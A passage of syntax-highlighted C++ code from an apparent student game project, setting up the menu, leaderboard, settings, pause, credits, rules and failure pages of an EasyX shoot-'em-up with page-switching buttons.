class="string">L&quot;简单&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            difficulty = <span class="number">1</span>; <span class="comment">// 难度设置为简单</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">3</span>, difficulty_easy); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在游戏难度页面创建中等按钮</span></span><br><span class="line">        Button *difficulty_medium = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">310</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;中等&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            difficulty = <span class="number">2</span>; <span class="comment">// 难度设置为中等</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">3</span>, difficulty_medium); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在游戏难度页面创建地狱按钮</span></span><br><span class="line">        Button *difficulty_hard = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">420</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;地狱&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            difficulty = <span class="number">3</span>; <span class="comment">// 难度设置为地狱</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">3</span>, difficulty_hard); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在游戏难度页面创建返回按钮</span></span><br><span class="line">        Button *difficulty_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">530</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;返回开始界面&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">1</span>); <span class="comment">// 返回开始界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">3</span>, difficulty_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 创建排行榜页面</span></span><br><span class="line">        <span class="built_in">drawpage</span>(<span class="string">L&quot;./resource/page/rank.jpg&quot;</span>, rank_name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在排行榜页面创建简单按钮</span></span><br><span class="line">        Button *rank_easy = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">200</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;简单榜&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">7</span>); <span class="comment">// 进入简单排行榜</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">4</span>, rank_easy); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在排行榜页面创建中等按钮</span></span><br><span class="line">        Button *rank_medium = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">310</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;中等榜&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">8</span>); <span class="comment">// 进入中等排行榜</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">4</span>, rank_medium); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在排行榜页面创建地狱按钮</span></span><br><span class="line">        Button *rank_hard = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">420</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;地狱榜&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">9</span>); <span class="comment">// 进入地狱排行榜</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">4</span>, rank_hard); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在排行榜页面创建返回按钮</span></span><br><span class="line">        Button *rank_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">530</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;返回开始界面&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">1</span>); <span class="comment">// 返回开始界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">4</span>, rank_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 游戏设置界面</span></span><br><span class="line">        <span class="built_in">drawpage</span>(<span class="string">L&quot;./resource/page/set.jpg&quot;</span>, set_name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在开始界面的设置界面页面创建音效按钮</span></span><br><span class="line">        Button *setinstart_music = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">200</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;打开/关闭音效&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">controlsound</span>(); <span class="comment">// 控制音效</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">5</span>, setinstart_music); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在开始界面的设置界面页面创建游戏玩法按钮</span></span><br><span class="line">        Button *setinstart_rule = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">310</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;游戏玩法&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">11</span>); <span class="comment">// 进入游戏玩法</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">5</span>, setinstart_rule); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在开始界面的设置界面页面创建制作组信息按钮</span></span><br><span class="line">        Button *setinstart_author = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">420</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;制作组信息&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">10</span>); <span class="comment">// 进入制作组信息界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">5</span>, setinstart_author); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在开始界面的设置界面页面创建返回按钮</span></span><br><span class="line">        Button *setinstart_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">530</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;返回开始界面&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">1</span>); <span class="comment">// 返回开始界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">5</span>, setinstart_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 创建暂停界面</span></span><br><span class="line">        <span class="built_in">drawpage</span>(<span class="string">L&quot;./resource/page/stop.jpg&quot;</span>, stop_name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在暂停页面创建继续游戏按钮</span></span><br><span class="line">        Button *stop_continue = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">200</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;继续游戏&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">2</span>); <span class="comment">// 返回游戏界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">6</span>, stop_continue); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在暂停页面创建重新开始按钮</span></span><br><span class="line">        Button *stop_restart = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">310</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;重新开始&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">2</span>); <span class="comment">// 初始化数据并返回游戏界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">6</span>, stop_restart); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在暂停页面创建音效按钮</span></span><br><span class="line">        Button *stop_music = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">420</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;打开/关闭音效&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">controlsound</span>(); <span class="comment">// 设置音效</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">6</span>, stop_music); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在暂停界面创建返回开始界面按钮</span></span><br><span class="line">        Button *stop_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">530</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;返回开始界面&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">1</span>); <span class="comment">// 返回开始界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">6</span>, stop_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7. 简单榜</span></span><br><span class="line">        <span class="built_in">drawpage</span>(<span class="string">L&quot;./resource/page/easy.jpg&quot;</span>, easy_name, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在简单榜界面创建返回排行榜界面按钮</span></span><br><span class="line">        Button *easy_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">530</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;返回排行榜&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">4</span>); <span class="comment">// 返回排行榜界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">7</span>, easy_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 8. 中等榜</span></span><br><span class="line">        <span class="built_in">drawpage</span>(<span class="string">L&quot;./resource/page/medium.jpg&quot;</span>, medium_name, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在中等榜界面创建返回排行榜界面按钮</span></span><br><span class="line">        Button *medium_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">530</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;返回排行榜&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">4</span>); <span class="comment">// 返回排行榜界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">8</span>, medium_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 9. 地狱榜</span></span><br><span class="line">        <span class="built_in">drawpage</span>(<span class="string">L&quot;./resource/page/hard.jpg&quot;</span>, hard_name, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在地狱榜界面创建返回排行榜界面按钮</span></span><br><span class="line">        Button *hard_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">530</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;返回排行榜&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">4</span>); <span class="comment">// 返回排行榜界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">9</span>, medium_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 10. 制作组</span></span><br><span class="line">        IMAGE *page_author = <span class="keyword">new</span> <span class="built_in">IMAGE</span>(width, height);</span><br><span class="line">        <span class="built_in">loadimage</span>(page_author, <span class="string">L&quot;./resource/page/author.jpg&quot;</span>, width, height, <span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, page_author);</span><br><span class="line">        <span class="comment">// 绘制制作组标题</span></span><br><span class="line">        RECT rect_author = &#123; <span class="number">220</span>, <span class="number">50</span>, <span class="number">580</span>, <span class="number">150</span> &#125;;</span><br><span class="line">        <span class="built_in">fillroundrect</span>(rect_author.left, rect_author.top, rect_author.right, rect_author.bottom, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制标题</span></span><br><span class="line">        <span class="built_in">settextcolor</span>(GREEN); <span class="comment">// 设置文本颜色为绿色</span></span><br><span class="line">        <span class="built_in">setbkmode</span>(TRANSPARENT); <span class="comment">// 设置文本背景透明</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">35</span>, <span class="number">0</span>, _T(<span class="string">&quot;华文琥珀&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        text_x = rect_author.left + (rect_author.right - rect_author.left - <span class="built_in">textwidth</span>(author_name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        text_y = rect_author.top + (rect_author.bottom - rect_author.top - <span class="built_in">textheight</span>(author_name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">outtextxy</span>(text_x, text_y, author_name.<span class="built_in">c_str</span>()); <span class="comment">// 在按钮上绘制文本</span></span><br><span class="line">        <span class="built_in">fillroundrect</span>(rect_author.left - <span class="number">100</span>, rect_author.top + <span class="number">120</span>, rect_author.right + <span class="number">100</span>, rect_author.bottom + <span class="number">370</span>, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制标题</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">28</span>, <span class="number">0</span>, _T(<span class="string">&quot;华文彩云&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left - <span class="number">40</span>, rect_author.top + <span class="number">130</span>, <span class="string">L&quot;成员&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left + <span class="number">220</span>, rect_author.top + <span class="number">130</span>, <span class="string">L&quot;负责部分&quot;</span>); <span class="comment">// 绘制简介</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">25</span>, <span class="number">0</span>, _T(<span class="string">&quot;华光行楷_CNKI&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        <span class="built_in">settextcolor</span>(<span class="built_in">RGB</span>(<span class="number">49</span>, <span class="number">128</span>, <span class="number">87</span>)); <span class="comment">// 设置文本颜色</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left - <span class="number">40</span>, rect_author.top + <span class="number">170</span>, <span class="string">L&quot;邓钦予&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left - <span class="number">40</span>, rect_author.top + <span class="number">200</span>, <span class="string">L&quot;何宁&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left - <span class="number">40</span>, rect_author.top + <span class="number">230</span>, <span class="string">L&quot;祖培宏&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left - <span class="number">40</span>, rect_author.top + <span class="number">260</span>, <span class="string">L&quot;李丰任&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left - <span class="number">40</span>, rect_author.top + <span class="number">290</span>, <span class="string">L&quot;杨永山泰&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left - <span class="number">40</span>, rect_author.top + <span class="number">320</span>, <span class="string">L&quot;千反田&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left - <span class="number">40</span>, rect_author.top + <span class="number">350</span>, <span class="string">L&quot;苏子乔&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left - <span class="number">40</span>, rect_author.top + <span class="number">380</span>, <span class="string">L&quot;沈兴满&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left - <span class="number">40</span>, rect_author.top + <span class="number">410</span>, <span class="string">L&quot;阿聪&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left - <span class="number">40</span>, rect_author.top + <span class="number">440</span>, <span class="string">L&quot;岳永&quot;</span>); <span class="comment">// 绘制昵称</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left + <span class="number">160</span>, rect_author.top + <span class="number">170</span>, <span class="string">L&quot;游戏界面设计&quot;</span>); <span class="comment">// 绘制简介</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left + <span class="number">160</span>, rect_author.top + <span class="number">200</span>, <span class="string">L&quot;游戏BOSS生成和运行逻辑&quot;</span>); <span class="comment">// 绘制简介</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left + <span class="number">160</span>, rect_author.top + <span class="number">230</span>, <span class="string">L&quot;游戏功能流程图整理&quot;</span>); <span class="comment">// 绘制简介</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left + <span class="number">160</span>, rect_author.top + <span class="number">260</span>, <span class="string">L&quot;子弹设计和代码整合&quot;</span>); <span class="comment">// 绘制简介</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left + <span class="number">160</span>, rect_author.top + <span class="number">290</span>, <span class="string">L&quot;子弹设计和代码整合&quot;</span>); <span class="comment">// 绘制简介</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left + <span class="number">160</span>, rect_author.top + <span class="number">320</span>, <span class="string">L&quot;敌机生成和运行逻辑&quot;</span>); <span class="comment">// 绘制简介</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left + <span class="number">160</span>, rect_author.top + <span class="number">350</span>, <span class="string">L&quot;数据保存加载和排行榜制作&quot;</span>); <span class="comment">// 绘制简介</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left + <span class="number">160</span>, rect_author.top + <span class="number">380</span>, <span class="string">L&quot;游戏音效设置&quot;</span>); <span class="comment">// 绘制简介</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left + <span class="number">160</span>, rect_author.top + <span class="number">410</span>, <span class="string">L&quot;玩家战机生成和运行逻辑&quot;</span>); <span class="comment">// 绘制简介</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_author.left + <span class="number">160</span>, rect_author.top + <span class="number">440</span>, <span class="string">L&quot;道具生成和运行逻辑&quot;</span>); <span class="comment">// 绘制简介</span></span><br><span class="line">        <span class="built_in">getimage</span>(page_author, <span class="number">0</span>, <span class="number">0</span>, width, height); <span class="comment">// 将页面的内容保存到图片中</span></span><br><span class="line">        <span class="built_in">addPage</span>(page_author); <span class="comment">// 添加制作组信息页面</span></span><br><span class="line">        <span class="comment">// 在制作组界面创建返回按钮</span></span><br><span class="line">        Button *author_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">540</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;返回设置&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">5</span>); <span class="comment">// 返回设置界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">10</span>, author_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 11. 游戏玩法说明</span></span><br><span class="line">        IMAGE *page_rule = <span class="keyword">new</span> <span class="built_in">IMAGE</span>(width, height);</span><br><span class="line">        <span class="built_in">loadimage</span>(page_rule, <span class="string">L&quot;./resource/page/rule.jpg&quot;</span>, width, height, <span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, page_rule);</span><br><span class="line">        <span class="comment">// 绘制玩法标题</span></span><br><span class="line">        RECT rect_rule = &#123; <span class="number">220</span>, <span class="number">50</span>, <span class="number">580</span>, <span class="number">150</span> &#125;;</span><br><span class="line">        <span class="built_in">fillroundrect</span>(rect_rule.left, rect_rule.top, rect_rule.right, rect_rule.bottom, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制标题</span></span><br><span class="line">        <span class="built_in">settextcolor</span>(GREEN); <span class="comment">// 设置文本颜色为绿色</span></span><br><span class="line">        <span class="built_in">setbkmode</span>(TRANSPARENT); <span class="comment">// 设置文本背景透明</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">35</span>, <span class="number">0</span>, _T(<span class="string">&quot;华文琥珀&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        text_x = rect_rule.left + (rect_rule.right - rect_rule.left - <span class="built_in">textwidth</span>(rule_name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        text_y = rect_rule.top + (rect_rule.bottom - rect_rule.top - <span class="built_in">textheight</span>(rule_name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">outtextxy</span>(text_x, text_y, rule_name.<span class="built_in">c_str</span>()); <span class="comment">// 在按钮上绘制文本</span></span><br><span class="line">        <span class="built_in">fillroundrect</span>(rect_rule.left - <span class="number">80</span>, rect_rule.top + <span class="number">120</span>, rect_rule.right + <span class="number">80</span>, rect_rule.bottom + <span class="number">370</span>, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制标题</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">25</span>, <span class="number">0</span>, _T(<span class="string">&quot;华文琥珀&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        <span class="built_in">settextcolor</span>(<span class="built_in">RGB</span>(<span class="number">49</span>, <span class="number">128</span>, <span class="number">87</span>)); <span class="comment">// 设置文本颜色为黑色</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_rule.left - <span class="number">40</span>, rect_rule.top + <span class="number">140</span>, <span class="string">L&quot;↑↓←→控制战机移动&quot;</span>);</span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_rule.left - <span class="number">40</span>, rect_rule.top + <span class="number">180</span>, <span class="string">L&quot;首页可以设置游戏难度&quot;</span>);</span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_rule.left - <span class="number">40</span>, rect_rule.top + <span class="number">220</span>, <span class="string">L&quot;昵称页面可以设置玩家昵称&quot;</span>);</span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_rule.left - <span class="number">40</span>, rect_rule.top + <span class="number">260</span>, <span class="string">L&quot;战机自动发射子弹&quot;</span>);</span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_rule.left - <span class="number">40</span>, rect_rule.top + <span class="number">300</span>, <span class="string">L&quot;击毁敌机分数增加, 被敌机击中生命值减少&quot;</span>);</span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_rule.left - <span class="number">40</span>, rect_rule.top + <span class="number">340</span>, <span class="string">L&quot;击毁BOSS游戏胜利, 生命值小于0游戏结束&quot;</span>);</span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_rule.left - <span class="number">40</span>, rect_rule.top + <span class="number">380</span>, <span class="string">L&quot;获得道具可以随机增加生命或子弹伤害&quot;</span>);</span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_rule.left - <span class="number">40</span>, rect_rule.top + <span class="number">420</span>, <span class="string">L&quot;游戏界面右上角可以暂停游戏&quot;</span>);</span><br><span class="line">        <span class="built_in">getimage</span>(page_rule, <span class="number">0</span>, <span class="number">0</span>, width, height); <span class="comment">// 将页面的内容保存到图片中</span></span><br><span class="line">        <span class="built_in">addPage</span>(page_rule); <span class="comment">// 添加玩法信息页面</span></span><br><span class="line">        <span class="comment">// 在玩法界面创建返回按钮</span></span><br><span class="line">        Button *rule_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">540</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;返回设置&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">5</span>); <span class="comment">// 返回设置界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">11</span>, rule_exit); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 12. 失败界面</span></span><br><span class="line">        IMAGE *page_fail = <span class="keyword">new</span> <span class="built_in">IMAGE</span>(width, height);</span><br><span class="line">        <span class="built_in">loadimage</span>(page_fail, <span class="string">L&quot;./resource/page/fail.jpg&quot;</span>, width, height, <span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, page_fail);</span><br><span class="line">        <span class="comment">// 绘制玩法标题</span></span><br><span class="line">        RECT rect_fail = &#123; <span class="number">220</span>, <span class="number">50</span>, <span class="number">580</span>, <span class="number">150</span> &#125;;</span><br><span class="line">        <span class="built_in">fillroundrect</span>(rect_fail.left, rect_fail.top, rect_fail.right, rect_fail.bottom, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制标题</span></span><br><span class="line">        <span class="built_in">settextcolor</span>(GREEN); <span class="comment">// 设置文本颜色为绿色</span></span><br><span class="line">        <span class="built_in">setbkmode</span>(TRANSPARENT); <span class="comment">// 设置文本背景透明</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">35</span>, <span class="number">0</span>, _T(<span class="string">&quot;华文琥珀&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        text_x = rect_fail.left + (rect_fail.right - rect_fail.left - <span class="built_in">textwidth</span>(fail_name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        text_y = rect_fail.top + (rect_fail.bottom - rect_fail.top - <span class="built_in">textheight</span>(fail_name.<span class="built_in">c_str</span>())) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">outtextxy</span>(text_x, text_y, fail_name.<span class="built_in">c_str</span>()); <span class="comment">// 在按钮上绘制文本</span></span><br><span class="line">        <span class="built_in">fillroundrect</span>(rect_fail.left, rect_fail.top + <span class="number">120</span>, rect_fail.right, rect_fail.bottom + <span class="number">60</span>, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制安慰</span></span><br><span class="line">        <span class="built_in">settextstyle</span>(<span class="number">25</span>, <span class="number">0</span>, _T(<span class="string">&quot;华文琥珀&quot;</span>)); <span class="comment">// 设置文本大小和字体</span></span><br><span class="line">        <span class="built_in">outtextxy</span>(rect_fail.left + <span class="number">90</span>, rect_fail.top + <span class="number">130</span>, <span class="string">L&quot;别走，决战到天亮！&quot;</span>); <span class="comment">// 绘制失败安慰</span></span><br><span class="line">        <span class="built_in">getimage</span>(page_fail, <span class="number">0</span>, <span class="number">0</span>, width, height); <span class="comment">// 将页面的内容保存到图片中</span></span><br><span class="line">        <span class="built_in">addPage</span>(page_fail); <span class="comment">// 添加失败页面</span></span><br><span class="line">        <span class="comment">// 在失败页面创建音效设置按钮</span></span><br><span class="line">        Button *fail_music = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">250</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;打开/关闭音效&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">controlsound</span>(); <span class="comment">// 音效设置</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">12</span>, fail_music); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在失败页面创建再次挑战按钮</span></span><br><span class="line">        Button *fail_restart = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">360</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;再次挑战&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span class="built_in">setCurrentIndex</span>(<span class="number">2</span>); <span class="comment">// 初始化数据并返回游戏界面</span></span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="built_in">addButton</span>(<span class="number">12</span>, fail_restart); <span class="comment">// 将按钮添加到页面</span></span><br><span class="line">        <span class="comment">// 在失败页面创建返回按钮</span></span><br><span class="line">        Button *fail_exit = <span class="keyword">new</span> <span class="built_in">Button</span>(<span class="number">320</span>, <span class="number">470</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="string">L&quot;返回开始界面&quot;</span>, [&amp;]() &#123;</span><br><span class="line">            <span 